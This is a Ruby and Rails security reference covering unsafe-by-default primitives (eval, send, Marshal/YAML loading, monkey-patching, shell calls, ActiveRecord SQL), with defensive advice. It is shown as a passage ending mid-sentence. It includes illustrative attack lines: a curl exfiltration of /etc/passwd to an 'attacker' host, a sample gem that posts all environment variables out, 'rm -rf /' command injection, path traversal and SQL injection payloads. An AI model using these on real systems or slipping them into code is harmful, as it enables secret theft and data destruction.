# Ruby Behavioral Footguns — Language Primitives That Are Unsafe by Default
## Synthesized from Ruby and Rails core team engineers, Trail of Bits / GitHub Security Lab / NCC / elttam / Bishop Fox researchers, and the institutional advisories that catalog Ruby-specific failure modes

> **Currency marker:** Last refreshed 2026-05-14. Companion to
> `csharp_dotnet_footguns_expertise.md` and `java_footguns_expertise.md`.
> Load-bearing 2023-2026 updates: Luke Jahnke's 2024 "Ruby 3.4 Universal
> RCE Deserialization Gadget Chain" + "Gem::SafeMarshal escape"; Trail of
> Bits' 2025 "Marshal madness" retrospective; 2025 Oj deserialization
> writeup (Matt Palmer); 2023 ActiveRecord
> annotation SQLi (CVE-2023-22794).
>
> **Researchers:**
> - **Aaron Patterson** (@tenderlove) — only engineer on both core Ruby and
>   core Rails teams; member of both security response teams. Co-author (with Mike Dalessio) of
>   Nokogiri (XML/HTML parser) and Psych (YAML parser, locus of the 3.1
>   safe-by-default switch). Primary upstream source for `Marshal` /
>   `YAML` / `Psych` security decisions.
> - **Luke Jahnke** — published "Ruby 2.x Universal RCE Deserialization
>   Gadget Chain" (elttam, 2018) — first programmatic gadget-hunt across
>   the Ruby standard library targeting `Marshal.load`. Returned Nov 2024
>   with "Ruby 3.4 Universal RCE Deserialization Gadget Chain" and Dec 2024
>   "Gem::SafeMarshal escape." Cross-link
>   [[reference-deserialization-expertise]] for the chain-by-chain
>   timeline.
> - **William Bowling** (vakzz) — "Universal Deserialisation Gadget for
>   Ruby 2.x-3.x" (devcraft.io, Jan 2021) and "Round Two" update (Apr
>   2022); chain through `Gem::Requirement#marshal_load → TarReader#each →
>   TarHeader#from → Net::BufferedIO → Net::WriteAdapter#<<` works on Ruby
>   2.0 through 3.0.2.
> - **Etienne Stalmans** (Staaldraad) — "Argument injection and getting
>   past shellwords.escape" (Nov 2019): `Shellwords.escape` does not
>   escape `-`, permitting tar argument injection and command execution.
>   Cross-link [[reference-shell-injection]].
> - **Alex Leahu** (Include Security) — "Discovering Deserialization Gadget
>   Chains in Rubyland" (Mar 2024); extends Jahnke/Bowling with Rails-
>   library gadget hunting via grep-based program analysis.
> - **Charlie Somerville** (charliesome) — Ruby internals via
>   `bugs.ruby-lang.org`.
> - **Justin Collins** (@presidentbeef) — author and maintainer of
>   Brakeman, the de facto Rails security scanner; encodes most of the
>   audit heuristics here as analyzer warnings.
> - **Trail of Bits Ruby team** — Ruby Security Field Guide (2015);
>   RubyGems.org audit for Ruby Central (Aug-Sep 2024, 33 issues incl.
>   Marshal-adjacent); "Marshal madness: A brief history of Ruby
>   deserialization exploits" (Aug 2025), the canonical timeline.
> - **GitHub Security Lab Ruby team** — CodeQL Ruby query pack
>   (`codeql/ruby-queries`); "Execute commands by sending JSON?" Oj
>   deserialization writeup.
>
> **Institutional contributors:** RubySec `ruby-advisory-db`; Brakeman
> warning catalog; RuboCop Security cops; Rails Security Guide; OWASP
> Ruby on Rails Cheat Sheet; CodeQL Ruby Queries; Hanami Security
> defaults page; Sorbet documentation; Trail of Bits RubySec Field Guide.

Cross-links: see `deserialization_expertise.md` for the cross-language
deserialization bug class (the Ruby section there reads as the
backstory to §4 here); `shell_injection_expertise.md` for the generic
argv-vs-string-shell taxonomy (the Ruby section reads as the backstory
to §8 here); `code_review_expertise.md` for the click-count severity
heuristic and the auth-homogeneity pattern (apply both to every Rails
controller you review); `template_code_injection_expertise.md` for ERB
/ Haml / Slim / Liquid template injection (the Sinatra section reads
as backstory to §10 here); `ssrf_url_parsing_expertise.md` for
URI/`open-uri`/Net::HTTP parsing surface; `cicd_supply_chain_expertise.md`
for the Bundler/RubyGems-side supply chain (§11 here is the call-site
view); `race_conditions_concurrency_expertise.md` for Ractor/Fiber
hazards (§14); `redos_algorithmic_dos_expertise.md` for regex
back-tracking (§6); `semgrep_rule_authoring.md` for the detection-rule
authoring guidance referenced in §12.

---

## 1. The behavioral-footgun framing

Companion to `csharp_dotnet_footguns_expertise.md` and
`java_footguns_expertise.md`: this catalogs Ruby primitives whose
*default behavior* is unsafe, distinct from the cross-language bug-class
docs.

A *bug class* answers "what kind of vulnerability is this." A
*behavioral footgun* answers "what does this primitive *do*, such that
ordinary use produces a bug class without the developer noticing."
`eval(user_input)` is the obvious case. But `obj.send(user_method)` is
a footgun: it looks like a method call, and the interpreter happily
invokes `eval` if that's what the string names. `Marshal.load(io)` is
the same shape: it looks like reading a file, and its default behavior
is "instantiate whatever objects the byte stream describes, calling
arbitrary `_load` and `init_with` callbacks." Ruby's "principle of
least surprise" is itself a footgun multiplier in adversarial contexts.

Three properties of Ruby amplify behavioral footguns:

1. **Everything is an object, including classes.** No stable boundary
   between "the program" and "the runtime"; introspection and
   modification of one is introspection and modification of the other.
2. **Open classes by default.** Any code in any gem may reopen
   `String`, `Integer`, `Hash`, or `Kernel` and replace, wrap, or add
   methods. The class you call `.to_s` on is the union of every file
   that touched it, in load order.
3. **Symbols permanence pre-2.2.** Prior to 2.2 every distinct symbol
   lived for the process lifetime; after 2.2 dynamic symbols are GC'd
   but literal symbols remain.

Cross-link [[reference-code-review-expertise]] §"Auth-homogeneity audit
pattern" — Ruby's open-class default makes it impossible to reason
about a single class's behavior from a single source file. The
code reviewer's first move is `grep -r 'class String' .` to find the
monkey-patches that change the meaning of every later call site.

**Audit-cost asymmetry:** the developer writes
`Model.order(params[:sort])` once; the auditor reads it many times.
The developer either knows that ORDER BY clauses cannot be
parameterized (column identifiers are not bindable), or writes a SQL
injection. The auditor must know the rule, recognize the call site,
*and* trace `params[:sort]` to its source — for every controller
action. The footgun is a review problem, not a write problem.
Detection tooling (Brakeman, Semgrep, CodeQL, RuboCop Security cops) is
the scalable answer; the detection patterns in §12 are the load-
bearing artifact of this document.

---

## 2. `eval`, `instance_eval`, `class_eval`, `module_eval`

### 2.1 `Kernel#eval` — the obvious case

`eval(string)` parses and executes `string` as Ruby code in the
caller's binding. `eval(USER_INPUT)` is direct remote code execution.
There is no safe-mode flag, no allowlist, no sandbox. RuboCop's
`Security/Eval` cop flags `eval(...)` calls with a dynamic
(non-literal) string argument.

Real-world `eval` sinks in Ruby code:

```ruby
# Direct
eval(params[:expression])

# Routed through a DSL — common in legacy Sinatra-flavored apps
config_from_file = File.read("config.rb")
eval(config_from_file)        # arbitrary code if file is attacker-controlled

# In a "calculator" feature
result = eval(params[:formula]) rescue "error"
```

Every one of these is RCE. The `rescue` clause does not help — the
exception fires *after* the code has executed. The `eval` reads `result`
back, but `system("curl http://attacker/$(cat /etc/passwd | base64)")`
ran first.

### 2.2 `instance_eval`, `class_eval`, `module_eval`

`obj.instance_eval(string)` evaluates `string` with `self` bound to
`obj` — direct access to private methods and instance variables.
`Klass.class_eval(string)` evaluates in class-body context;
`module_eval` is the module equivalent. Method definitions inside the
string redefine class behavior process-globally:
`User.class_eval("def admin?; true; end")` from a request handler
permanently elevates every user in the process. `Object.class_eval(USER)`
rewrites the ancestor of every Ruby class.

The block forms (`instance_eval { ... }`, `instance_exec(arg, &block)`)
are safer in that code structure is static; only the *receiver* (and
args, for `*_exec`) are dynamic. Praetorian names
`instance_eval`, `send`, `public_send`, and `constantize` as the
canonical Ruby reflection sinks.

### 2.3 `define_method` and `method_missing`

`define_method(name, &body)` defines methods by name; user-controlled
name with static body is bounded-attack-surface; both dynamic is
`class_eval` by another path. `method_missing(name, *args)` fires on
unknown method lookup — Rails's `find_by_*` dynamic finders worked
this way. The "everything works at the cost of typo-detection" trap:
`obj.tipo` where `obj` defines `method_missing` does not raise; it
dispatches to the handler. Every `method_missing` override is an
audit point.

### 2.4 The "DSL via eval" pattern

Common legacy idiom:

```ruby
class Config
  def self.load(path)
    instance_eval(File.read(path), path)
  end
end
```

"The config file is just Ruby code" — every config file written by
anyone other than the application author is RCE. Cross-link
[[reference-template-code-injection]] §"Configuration as code".

### 2.5 Defensive sketch

- No `eval`, `instance_eval`, `class_eval`, `module_eval`,
  `instance_exec`, `class_exec` on user input. RuboCop `Security/Eval`.
- For dynamic dispatch in DSLs: hash-of-Proc allowlist
  (`actions = { "send" => ->(x) { ... } }`). The lookup raises on
  absent keys rather than executing arbitrary code.
- `binding.eval` and `Binding#eval` are equivalent sinks.

---

## 3. `send`, `public_send`, dynamic dispatch

### 3.1 `obj.send(method, *args)` — invoke any method

`obj.send(:method_name, args)` invokes `method_name` on `obj`,
*including private and protected methods*. `obj.send("eval", code)`
runs `obj.eval(code)`. `obj.send("system", cmd)` runs
`obj.system(cmd)`. The argument can be a `Symbol` or a `String`.

The historical workaround was `public_send`, which only invokes
public methods. But `send` itself is a public method, so
`obj.public_send("send", "eval", "code")` re-enters the private-method
surface. Ruby Issue #6409 acknowledged this in 2012; the conclusion was
that `public_send` provides no security boundary against attacker-
chosen method names.

### 3.2 Defense: hash-of-symbols allowlist

The defense is **never let a string from user input name a method**:

```ruby
ACTIONS = { "search" => :do_search, "export" => :do_export }
def handle(params)
  method_name = ACTIONS[params[:action]]
  return head :not_found unless method_name
  public_send(method_name)
end
```

Brakeman flags `Dangerous Send` on user-input method names.

### 3.3 `const_get`, `const_set`, `constantize`

`Object.const_get("File")` returns `File`; default lookup walks the
`Object` namespace (Ruby Bug #18622 documents this is by design).
`Object.const_get(params[:cls]).send(params[:m])` is a generic
"instantiate any class and call any method" primitive. ActiveSupport's
`String#constantize` / `safe_constantize` are sugar over `const_get` —
`params[:class].constantize.find(params[:id])` is a generic IDOR plus
class-confusion primitive in any Rails app. `const_set` writes to the
constant table; combined with monkey-patching (§5), redefines core
classes from user input.

### 3.4 `Class.new` and `instance_variable_set`

`Class.new(superclass) { ... }` creates anonymous classes; with
user-controlled superclass via `const_get`, MRO is attacker-chosen.
`obj.instance_variable_get(:@foo)` / `instance_variable_set` reach
into receiver internals; user-controlled names are full state-
mutation primitives. Brakeman flags as critical.

---

## 4. `Marshal.load` and YAML.load

### 4.1 `Marshal.load(USER)` — direct RCE

`Marshal.dump` serializes any Ruby object; `Marshal.load` reconstructs
it, calling `_load` / `init_with` / `marshal_load` callbacks along the
way. `Marshal.load(attacker_bytes)` instantiates whatever object graph
the attacker described.

Timeline: Luke Jahnke's 2018 elttam writeup was the first programmatic
gadget hunt across the Ruby stdlib.
William Bowling's Jan 2021 chain through `Gem::Requirement#marshal_load
→ TarReader#each → TarHeader#from → Net::BufferedIO →
Net::WriteAdapter#<<` works on Ruby 2.0 through 3.0.2; "Round Two"
(Apr 2022) refined after subsequent patches. Jahnke returned Nov 2024
with the Ruby 3.4 chain and Dec 2024 with `Gem::SafeMarshal` escape —
the latter bypasses RubyGems' attempt to sandbox install-time Marshal.
Cross-link [[reference-deserialization-expertise]]; Trail of Bits'
"Marshal madness" (Aug 2025) is the public retrospective.

Audit rule: every `Marshal.load`, `Marshal.restore`, `marshal_load`
is a candidate sink. Rails session cookies historically used
`:marshal` as the default serializer; combined with a known
`SECRET_KEY_BASE` (§9.12), Marshal-forged sessions are RCE
(Metasploit `exploit/multi/http/rails_secret_deserialization`, 2013).
Rails 4.1+ defaults to `:json` for new apps; existing apps inherit
`:marshal`.

### 4.2 `YAML.load(USER)` — pre-Psych 4 RCE

Prior to Ruby 3.1, `YAML.load(string)` (== `Psych.load`) was unsafe by
default. YAML supports `!ruby/object:ClassName` tags that instantiate
arbitrary classes with attacker-controlled instance variables —
gadgets reach RCE through `init_with` / `[]=` / implicit calls.
Etienne Stalmans' "Universal RCE with Ruby YAML.load" (2019) ports
Jahnke's Marshal gadget through the `!ruby/object` tag.

Ruby 3.1 / Psych 4 (`github.com/ruby/psych/issues/533`) flipped the
default: `YAML.load` is now `safe_load` semantics, disallowing
arbitrary classes unless `permitted_classes:` is specified.
Escape hatches:

- `YAML.unsafe_load`: explicit unsafe loader, equivalent to
  pre-Psych-4 `YAML.load`. RCE on attacker-influenced input.
- `YAML.safe_load(s, permitted_classes: [...], aliases: true)`: safe
  only with a closed set of callback-free types. Permitting `Symbol`
  + `aliases: true` reintroduces symbol-DoS; permitting an
  ActiveSupport class with `init_with` reintroduces gadgets.
- `Psych.load_stream`: does not get the safe default; in Psych 4 it
  calls `to_ruby` with no class restriction.

### 4.3 `Oj.load` — multiple unsafe modes

`Oj` is the high-performance JSON library used in many Rails apps and
background-job workers (Sidekiq, Resque). `Oj.load` has parsing
*modes*: `:object` (default — instantiates Ruby objects via `^o`
directives), `:compat`, `:strict`, `:null`, `:rails`. `:object` mode
is unsafe in the same shape as `YAML.unsafe_load`. The Jul 2025
"Object deserialization attacks using Ruby's Oj JSON parser" (Matt
Palmer) documented RCE via `Oj.load` with default options. Sidekiq-class
frameworks accept job args from Redis; an attacker reaching Redis
lands RCE via the worker.

Recommended: `Oj.default_options = { mode: :strict }` at app init.
GitHub Security Lab's "Execute commands by sending JSON?" is the
canonical writeup.

### 4.4 `JSON.load` vs `JSON.parse`

`JSON.load(string)` can deserialize arbitrary Ruby objects
named via the `json_class` key. `JSON.parse(string)` only emits
plain Ruby values (`Hash`, `Array`, `String`, `Integer`, `nil`,
booleans). Audit rule: **never use `JSON.load` on attacker-controlled
input**; always use `JSON.parse`. RuboCop's `Security/JSONLoad`
encodes this.

### 4.5 Defensive sketch

- No `Marshal.load`/`Marshal.restore` on attacker bytes. Only safe
  source: bytes from the same trusted process + MAC (Rails signed
  cookies).
- Rails sessions: `:json` serializer (4.1+ default); migrate apps
  still on `:marshal`. Signed cookies don't protect if
  `SECRET_KEY_BASE` leaks (§9.12).
- YAML: `safe_load` with explicit `permitted_classes`. RuboCop
  `Security/YAMLLoad`.
- Oj: `Oj.default_options = { mode: :strict }` at boot.
- JSON: `JSON.parse`, never `JSON.load`. RuboCop `Security/JSONLoad`.

Cross-link [[reference-deserialization-expertise]] §3-4 for the
cross-language view.

---

## 5. Monkey-patching and open classes

### 5.1 Open classes by default

```ruby
class String
  def upcase
    "I refuse"
  end
end
```

Every later `String#upcase` in the process returns `"I refuse"`,
including calls from within Rails internals, ActiveSupport, every
loaded gem, and the user's own code. There is no namespace, no
import gate, no warning. The reopened class is a side-effect of
loading the file.

This is intentional Ruby design — it powers ActiveSupport (which
adds `Hash#stringify_keys`, `String#blank?`, `Integer#hours`, hundreds
more), Rails generators, RSpec matchers, and Sinatra route DSLs.
But the same primitive lets a malicious gem add an exploitable
method to `Kernel`, `Object`, or `String` that fires on every later
call.

### 5.2 The supply-chain attack surface

A gem in your `Gemfile.lock`:

```ruby
# lib/innocent_gem.rb
class Object
  def to_s
    Net::HTTP.post(URI("http://attacker/leak"),
                   ENV.to_h.to_json)
    super
  end
end
```

This runs `Net::HTTP.post` on every `to_s` call in your application
after `innocent_gem` is loaded, exfiltrating every environment
variable to attacker-controlled infrastructure. Logging, ERB
rendering, `inspect`, and dozens of internal Ruby paths invoke
`to_s` implicitly.

`bundle install` runs the gem's `Gemfile`-level Ruby code; `require`
of the gem runs its top-level Ruby. Cross-link
[[reference-cicd-supply-chain]] §"Bundler / RubyGems" and §11 below.

### 5.3 Refinements as partial mitigation

Ruby 2.0+ refinements are **lexically scoped** — only active within
the file/module that calls `using`. The cleanest mitigation: a gem
can add `String#blank?` via `refine String do ... end`, and callers
opt in with `using GemModule`. But: refinements bust VM method
caches (significant runtime cost) and adoption is slow. ActiveSupport
and most real-world "add methods to core classes" code still uses raw
monkey-patching. Eileen Uchitelle's "The Case Against Monkey Patching"
(Shopify Engineering) is the canonical Rails-core-perspective writeup.

### 5.4 `Module#prepend` — interception primitive

`SomeClass.prepend(LogCalls)` inserts the module *before* the target
class in the method lookup chain. `LogCalls#some_method` fires first
and can wrap/replace/skip via `super`. More controlled than
`class_eval`-rewrite (original reachable via `super`) but still a
process-global mutation any loaded code can perform on any class.

### 5.5 The audit rule

For every class your codebase relies on:
`grep -r "class ClassName" .` over the entire dependency tree.
For every gem in `Gemfile.lock`: review its `gemspec` (the install-
time code runs *during `bundle install`*) and its top-level
`lib/*.rb` (loaded on first `require`).

The `bundler-audit` gem reads the RubySec `ruby-advisory-db` and
flags known-vulnerable versions in `Gemfile.lock`. Combine with
Dependabot or Renovate to keep gem versions current. Cross-link
[[reference-cicd-supply-chain]] §11 below.

---

## 6. String + symbol footguns

### 6.1 `String#%` format-string injection

```ruby
template = "User: %s"
"Hello, #{template % params[:name]}"   # Safe — % consumes %s
template = params[:format] || "User: %s"
puts template % current_user.name      # Footgun if params[:format]
```

`String#%` interprets `%`-directives in the receiver. If the receiver
is attacker-controlled, the attacker controls the format string:
`"%1000000s"` produces a million-space string (memory DoS);
`%-style` directives can crash via `ArgumentError` when arity
mismatches; `%` with named references (`"%{name}"`) plus a hash
operand can probe object state. Cross-link
[[reference-code-review-expertise]] §"Format strings almost always
have a better approach". Brakeman has no warning class for
`String#%` injection specifically; Semgrep can detect
`USER_INPUT % ...` patterns.

The Ruby format-string class is narrower than C's (`%n` does not
exist in Ruby — there is no arbitrary-write primitive), but DoS
and information disclosure are still in scope.

### 6.2 Regex back-tracking — Onigmo + ReDoS

Ruby's default `Regexp` engine (Onigmo) is a back-tracking NFA.
Nested-quantifier patterns (`(a+)+b`, `(a|a)+`) on inputs that
almost-match exhibit catastrophic back-tracking; request handling
time grows exponentially. Attacker-controlled input + dev pattern is
the standard ReDoS; attacker-controlled pattern via
`Regexp.new(params[:q])` is worse — controls both sides.

Ruby 3.2+ has `Regexp.timeout = N` (process-wide; 1-5 seconds typical)
or per-regex `Regexp.new(pattern, timeout: N)`. Cross-link
[[reference-redos-algorithmic-dos]] for the taxonomy.

### 6.3 `Symbol.all_symbols` and pre-2.2 symbol DoS

Before Ruby 2.2, every distinct symbol was permanent — `to_sym` on
user input accumulated until OOM. 2.2 made *dynamic* symbols GC'd;
literal symbols remain permanent. For new code: avoid `to_sym` on
user input; `Hash#[]` with string keys is equivalent for indifferent-
access maps. `params[:foo]` (Rails layer handles conversion) is the
safe form, not `params[user_string.to_sym]`.

### 6.4 `Object#to_s` / `Object#inspect`

Open-classes default: any gem can redefine `to_s`/`inspect` to leak
instance variables, env, or arbitrary state — string interpolation
(`"value: #{obj}"`) invokes `to_s` implicitly. ActiveRecord's
`filter_attributes` and Rails `params.inspect` redact known-sensitive
keys; custom classes inherit `Object#inspect` which dumps everything
including credentials stored in instance variables.

---

## 7. Filesystem / path footguns

### 7.1 `File.read(USER_PATH)` — path traversal

```ruby
def download
  send_file "uploads/#{params[:filename]}"
end
```

`params[:filename] = "../../../etc/passwd"` reads `/etc/passwd`. The
standard library's `File.read`, `File.open`, `File.readlines`,
`IO.read` do not constrain paths — they accept absolute paths
(`"/etc/passwd"`), parent-directory traversal (`"../"`), null bytes
in older Ruby versions, and Windows-style drive letters
(`"C:\\..."`).

Defense: resolve the path to an absolute form (`File.expand_path`)
and verify the result is within an allowed root. Cross-link
[[reference-code-review-expertise]] §"User-input paths must be
resolved AND verified" for the two-step recipe in Ruby/Python/Java/Go/
Node.

```ruby
def safe_path_under(root, user_input)
  full = File.expand_path(user_input, root)
  raise "outside root" unless full.start_with?("#{File.realpath(root)}/")
  full
end
```

Even this fails in some symlink scenarios — see `File.realpath`
which raises on missing paths but follows symlinks. The
attacker-controlled path may be a symlink to outside the root. Use
`Pathname#realpath` plus a check that the parent is a real
directory; in adversarial multi-tenancy contexts, avoid following
symlinks entirely (`File.lstat` and explicit type check).

### 7.2 Sprockets path traversal — CVE-2018-3760

Sprockets ≤2.12.4 / ≤3.7.1 / ≤4.0.0.beta7 in production with
`config.assets.compile = true` had a `%2e%2e/` URL-encoded path
traversal: the `forbidden_request?` check ran on raw path before
URL-decode. Fix: decode first, then constrain. Illustrates the
generic path-handling failure: developers expected constraint to a
known root; the constraint was applied at the wrong layer.

### 7.3 `Dir.glob`, `FileUtils.cp_r`, `Tempfile.new`

- `Dir.glob("uploads/#{params[:filter]}*.txt")`: `filter =
  "../../../etc/*"` lists outside the root; `"**/{a,b,c,d,e,f,g}"`
  is glob-DoS via exponential branching. Defense: never let user
  input contribute glob metacharacters (`*`, `?`, `[`, `{`).
- `FileUtils.cp_r(src, USER_DEST)`: follows symlinks at destination
  by default. Attacker-controlled `dest/inner → /etc` writes into
  `/etc`.
- `Tempfile.new(USER_PREFIX)`: CVE-2021-28966 — pre-fix, prefix
  accepted `"..\\..\\.."` on Windows. Fix strips separator
  characters. Even with fix, user-controlled prefix appears in
  filenames passed to logs/command lines — argument injection
  surface.

### 7.4 `File.open` modes and symlink-following

`File.open(path, "w")` truncates; `"a"` appends and follows symlinks
to the link target. Default permissions for new files are `0666 &
~umask` — typically world-readable on Linux. Secrets files need
explicit `0600`. Most Ruby FS APIs follow symlinks; `File.lstat` is
the symlink-aware alternative.

---

## 8. `Kernel#system`, `exec`, backticks, `popen`

### 8.1 Backticks `` `cmd` `` — always shell

The backtick literal `` `command` `` runs `command` through the
shell (`/bin/sh -c`) and returns stdout as a string. There is no
argv form. `` `ls #{params[:dir]}` `` with `params[:dir] = "; rm
-rf /"` produces `ls ; rm -rf /` — direct shell command injection.

Cross-link [[reference-shell-injection]] §"Shell-vs-argv split" for
the cross-language treatment. The Ruby footgun is that backticks
look like normal string interpolation; the shell semantics are
implicit. RuboCop has no specific cop for backticks-with-interpolation;
Semgrep can detect `` `...#{USER}...` `` patterns.

### 8.2 `system(STRING)` vs `system("cmd", *args)`

`Kernel#system` has two forms:

```ruby
system("ls #{params[:dir]}")        # Shell form — DANGEROUS
system("ls", params[:dir])          # Argv form — safer
```

The single-string form spawns `/bin/sh -c "string"`. The multi-
argument form spawns the command directly without a shell. The
multi-argument form is safer but **not** safe — `params[:dir] =
"--exec=/bin/sh"` reaches argument injection (the Etienne Stalmans
shellwords-escape research applies). Cross-link
[[reference-shell-injection]] §"Argument injection past
shell-escape primitives".

Brakeman flags `Command Injection` warnings when the arguments
include user input.

### 8.3 `IO.popen`, `Open3`, `exec`, `Process.spawn`

All accept the same shell-vs-argv split. Argv form (`Open3.capture2(
"ls", path)`, `IO.popen(["ls", path]) { |io| io.read }`) prevents
shell-meta injection but argument injection remains in scope.
`Open3.capture3` adds stderr+status capture; `Open3.popen3` is the
interactive form. `Process.spawn` is the async variant. `IO.popen`'s
block form ensures FD cleanup.

### 8.4 `Shellwords.escape` — Stalmans bypass

`Shellwords.escape` escapes shell metacharacters but **not the hyphen
`-`**. Stalmans (Nov 2019):
`system("tar xf " + Shellwords.escape(user_filename))` is exploitable
by chaining `tar` flags: `-P` to place an attacker file at a known path,
then `-T` to read further options (checkpoint actions) from it —
`tar` reads these as flags. Output is shell-safe but not tar-safe.
Cross-link [[reference-shell-injection]]. Defense: argv-form spawn
*and* input-layer reject leading `-` (`raise unless user_filename =~
/\A[^-]/`). Argv form alone does not protect against argument
injection; the spawned program parses its argv after the shell layer
is gone.

### 8.5 `Kernel#open` — the open-uri footgun

```ruby
require "open-uri"
content = open(params[:file]).read     # http:// → Net::HTTP; "|cmd" → shell (<4.0)
```

`open("|cmd")` spawns a subprocess; Ruby 3.3 deprecates the leading
`|` form and Ruby 4.0 removes it; `URI.open` (network) and `File.open` (filesystem) are the
explicit alternatives. RuboCop `Security/Open` flags
`Kernel#open` / `URI.open` with non-literal arguments. Cross-link [[reference-ssrf-url-parsing]] for the
SSRF surface `open-uri` introduces.

### 8.6 Defensive sketch

- Backticks: never with interpolated user input.
- `system`/`exec`/`Process.spawn`: argv form only.
- `Shellwords.escape`: not sufficient for argument injection; combine
  with input-layer reject for leading `-`.
- `Kernel#open`: replace with `URI.open` or `File.open`.

---

## 9. Rails-specific footguns

### 9.1 `params` and `HashWithIndifferentAccess`

Rails's `params` is an `ActionController::Parameters`, a wrapper
around `HashWithIndifferentAccess`. Symbol-key lookups (`params[:id]`)
and string-key lookups (`params["id"]`) both succeed. Convenient,
but the indifference hides a footgun: `params[:foo].to_sym` invites
symbol-DoS on pre-2.2 Ruby; `params[:cls].constantize` invites
arbitrary-class lookup; `params[:method].to_sym` plus `send`
reaches arbitrary-method dispatch.

Rule: pull values out of `params` as strings and treat them as
strings. Convert with allowlist lookups (`{"foo" => :bar}[params[:k]]`),
not `.to_sym` on the raw string.

### 9.2 Mass assignment + strong parameters

Pre-Rails-4 `User.new(params[:user])` blindly assigned every key. The
GitHub March 2012 disclosure (Egor Homakov) used this in GitHub's
public-key form to add his SSH key to the Rails project's committers
and push to `rails/rails`. Rails 4
introduced `strong_parameters`:
`User.new(params.require(:user).permit(:name, :email))`. Philosophy:
"assume unsafe until proven otherwise." Footgun: `permit(:user => {})`
permits any nested hash; `permit!` is the bypass escape hatch.
Brakeman `Mass Assignment` flags both.

### 9.3 `Model.where(USER_STRING)` — SQLi

```ruby
User.where("email = '#{params[:email]}'")   # SQLi
User.where("email = ?", params[:email])      # Safe
User.where(email: params[:email])            # Safe
```

The string form interpolates literally into the SQL. The
parameterized form (positional `?` or hash form) is the safe path.
ActiveRecord parameterizes the hash form; the string form is the
opt-out.

The Rails Security Guide includes a "SQL Injection" section that
catalogs the patterns. Brakeman's `SQL Injection` warning class
flags `where(USER_STRING)` patterns.

### 9.4 `Model.find_by_sql(USER)` — direct SQLi

```ruby
User.find_by_sql("SELECT * FROM users WHERE email = '#{params[:email]}'")
```

Direct SQL with interpolation. Brakeman flags. The
parameterized form is `find_by_sql(["SELECT ... WHERE email = ?",
params[:email]])` — array form with placeholders.

### 9.5 `find_by_*` and dynamic finders

`User.find_by_email_and_locked(...)` is a dynamic finder generated
via `method_missing`. The arguments are parameterized. Dynamic
finders with attacker-controlled method names
(`User.send("find_by_#{params[:field]}", params[:value])`) reach
arbitrary-attribute lookup — usable for IDOR or to bypass intended
scoping.

### 9.6 `Model.order(USER)` — column-name SQLi

```ruby
User.order(params[:sort])
```

ActiveRecord does not parameterize ORDER BY clauses (parameterized
queries cannot bind column identifiers). `params[:sort] = "(CASE
WHEN ... THEN 1 ELSE 0 END)"` reaches a blind-SQLi primitive — the
attacker controls the ORDER BY expression and can extract data one
bit at a time.

Defense: allowlist sortable columns.

```ruby
SORTABLE = %w[name created_at email].freeze
User.order(SORTABLE.include?(params[:sort]) ? params[:sort] : "id")
```

Rails 6.1+ raises `ActiveRecord::UnknownAttributeReference` for
`order(STRING)` with non-attribute SQL fragments unless wrapped in
`Arel.sql`; in 5.2-6.0 it raised only when `allow_unsafe_raw_sql` was
set to `:disabled`.

Brakeman's `SQL Injection` warning class flags `order(USER_INPUT)`.

### 9.7 `Model.annotate(USER)` — CVE-2023-22794

`Post.where(id: 1).annotate("from controller #{params[:ref]}")` —
the annotation is meant to be a SQL comment but the implementation's
comment escaping was insufficient.
`params[:ref] = "*/ ; DROP TABLE users; --"` escapes the comment and
injects SQL. Affected: ActiveRecord >= 6.0; fixed in 6.0.6.1, 6.1.7.1,
7.0.4.1. Same flaw in `optimizer_hints` and `QueryLogs` middleware.

### 9.8 `redirect_to params[:url]` — open-redirect

`redirect_to params[:return_url]` after login → phishing-flow bounce.
Rails 7+ defaults
`config.action_controller.raise_on_open_redirects = true` (raises on
different-host URL unless `allow_other_host: true`). Apps upgrading
inherit permissive default. Defense: `allow_other_host: false` or an
explicit host allowlist via `URI.parse`. Cross-link
[[reference-ssrf-url-parsing]] §"Open redirect" for parsing pitfalls
(scheme confusion, userinfo, IDN homoglyphs).

### 9.9 `html_safe`, `raw`, `render html:` — XSS bypass

`render html: params[:message].html_safe` is direct XSS — `html_safe`
marks the string trusted; ERB skips escaping. Equivalents: `raw(USER)`
(sugar for `.to_s.html_safe`), `<%== USER %>` in ERB. Defense: never
call on user input; use ERB default `<%= %>` (auto-escapes). For
HTML-with-markup, use the `sanitize` helper or Loofah. Brakeman
`Cross-Site Scripting`.

### 9.10 `link_to(USER_TEXT, USER_URL)` — double-escape

Rails auto-escapes the label but `href` is not validated as a URL —
`params[:url] = "javascript:alert(1)"` works. Defense: validate scheme
is HTTP/HTTPS before passing.

### 9.11 ActionController callback ordering

If `load_user` precedes `authorize!`, unauthorized requests reach
`load_user` (DB query, existence leak, side effects). Missing
`authorize!` on an action is silent — no compiler error. Audit:
enumerate every controller's `before_action` chain; verify auth/authz
fires before data load; verify every action is covered. Cross-link
[[reference-code-review-expertise]] §"Auth-homogeneity audit
pattern".

### 9.12 Session secret + cookie signing

Rails session cookies are signed via HMAC derived from
`SECRET_KEY_BASE`. If it leaks: forge any signed cookie. With
`:marshal` serializer (Rails < 4.1 default, still inherited by many
apps), forged session reaches `Marshal.load` — RCE via §4.1 gadgets.
With `:json`, forged sessions reach auth with attacker-chosen user
IDs — full account takeover. The 2013 Metasploit module
`exploit/multi/http/rails_secret_deserialization` automated this.
Public leak sources: `config/secrets.yml` checked into git; CI logs
echoing env vars; backup files.

Defense: 128+ hex chars from `bin/rails secret`; distinct per
environment; never in version control; rotate on leak.
`Rails.application.credentials` (5.2+) encrypts secrets at rest with
`RAILS_MASTER_KEY`.

### 9.13 ActiveStorage / Paperclip — content-type spoofing

ActiveStorage and (legacy) Paperclip validation hooks check
`avatar.content_type` — but the value is taken from the upload's
`Content-Type` header, which is attacker-controlled. Actual bytes may
be HTML, polyglot, or executable. Real validation requires magic-byte
inspection (the `marcel` gem; ActiveStorage uses it in recent
versions). For SVG/HTML uploads, direct-link-to-attachment renders as
the type the server claims — stored XSS. Paperclip is abandonware as
of 2018.

### 9.14 `class_attribute` — process-global Proc slot

`class_attribute :authorizer` creates a class-level inherited slot.
Setting `User.authorizer = USER_INFLUENCED_PROC` (e.g. from a runtime
configuration editable through an unprotected admin interface) reaches
arbitrary-Proc execution. Pattern appears in plugin/extension
frameworks.

### 9.15 Rack shell-terminal-escape — CVE-2022-30123

Rack 2.x prior to 2.0.9.1 / 2.1.4.1 / 2.2.3.1 passed request headers
to `Rack::Lint` and `Rack::CommonLogger` for logging without filtering
ANSI escape sequences. Headers containing `\x1b]0;evil\x07` (set-
terminal-title) caused the terminal where Rack was logging to execute
